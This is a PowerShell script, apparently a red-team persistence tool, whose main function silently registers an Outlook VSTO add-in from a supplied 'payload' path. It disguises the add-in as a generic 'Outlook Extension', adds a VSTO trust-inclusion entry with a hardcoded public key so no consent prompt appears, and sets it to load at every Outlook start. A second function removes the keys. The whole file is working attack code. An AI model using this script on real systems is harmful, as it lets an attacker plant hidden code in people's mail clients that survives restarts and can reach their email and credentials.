function Install-OutlookAddin {
<#
    .SYNOPSIS

        Installs an Outlook add-in.
        Author: @_vivami

    .PARAMETER PayloadPath

        The path of the DLL and manifest files

    .EXAMPLE

        PS> Install-OutlookAddin -PayloadPath C:\Path\to\Addin.vsto 
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        $PayloadPath
    )

    $RegistryPaths = 
        @("HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension"),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata"),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}"),
        @("HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a")
    
    $RegistryPaths | foreach {
        if(-Not (Test-Path ($_))) {
            try {
                New-Item -Path $($_) -Force | Out-Null
            } catch {
                Write-Error "Failed to set entry $($_)."
            }
        }
    }

    $RegistryKeys = 
        @("HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension", "(Default)", ""),
        @("HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension", "Description", "Outlook Extension"),
        @("HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension", "FriendlyName", "Outlook Extension"),
        @("HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension", "Manifest", "file:///$PayloadPath"),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata", "(Default)", ""),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata", "file:///$PayloadPath", "{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}"),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "(Default)", ""),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "addInName", ""),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "officeApplication", ""),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "friendlyName", ""),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "description", ""),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "loadBehavior", ""),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "compatibleFrameworks", "<compatibleFrameworks xmlns=`"urn:schemas-microsoft-com:clickonce.v2`">`n`t<framework targetVersion=`"4.0`" profile=`"Full`" supportedRuntime=`"4.0.30319`" />`n`t</compatibleFrameworks>"),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}", "PreferredClr", "v4.0.30319"),
        @("HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a", "Url", "file:///$PayloadPath"),
        @("HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a", "PublicKey", "<RSAKeyValue><Modulus>yDCewQWG8XGHpxD57nrwp+EZInIMenUDOXwCFNAyKLzytOjC/H9GeYPnn0PoRSzwvQ5gAfb9goKlN3fUrncFJE8QAOuX+pqhnchgJDi4IkN7TDhatd/o8X8O5v0DBoqBVQF8Tz60DpcH55evKNRPylvD/8EG/YuWVylSwk8v5xU=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>")

    foreach ($KeyPair in $RegistryKeys) {
        New-ItemProperty -Path $KeyPair[0] -Name $KeyPair[1] -Value $KeyPair[2] -PropertyType "String" -Force | Out-Null
    }
	Write-Host "Done."
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension" -Name "Loadbehavior" -Value 0x00000003 -Type DWord | Out-Null
}


function Remove-OutlookAddin {
<#
    .SYNOPSIS

        Removes the Outlook add-in
        Author: @_vivami

    .EXAMPLE

        PS> Remove-OutlookAddin 
#>
    $RegistryPaths = 
        @("HKCU:\Software\Microsoft\Office\Outlook\Addins\OutlookExtension"),
        @("HKCU:\Software\Microsoft\VSTO\SolutionMetadata"),
        #@("HKCU:\Software\Microsoft\VSTO\SolutionMetadata\{FA2052FB-9E23-43C8-A0EF-43BBB710DC61}"),
        @("HKCU:\Software\Microsoft\VSTO\Security\Inclusion\1e1f0cff-ff7a-406d-bd82-e53809a5e93a")
    
    $RegistryPaths | foreach {
        Remove-Item -Path $($_) -Force -Recurse
    }
}